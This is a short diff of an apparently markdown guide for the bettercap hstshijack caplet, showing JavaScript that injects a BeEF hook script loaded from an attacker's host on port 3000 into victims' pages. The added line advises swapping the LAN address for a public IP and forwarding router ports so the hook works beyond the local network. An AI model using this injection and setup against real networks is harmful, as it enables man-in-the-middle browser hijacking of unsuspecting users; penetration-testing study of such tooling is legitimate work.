@@ -22,6 +22,8 @@ imported.src = 'http://<IP>:3000/hook.js`; // replace with your BeEF hook url
 document.head.appendChild(imported);
 ```
 
+> If you want to use this outside your network, you should replace IP with your REAL IP, not LAN IP, and configure IP forwarding so that your router forwards requests coming through your set up port to your machine.
+
 And add to the caplet in `set hstshijack.payloads` value.
 
 Then start bettercap...
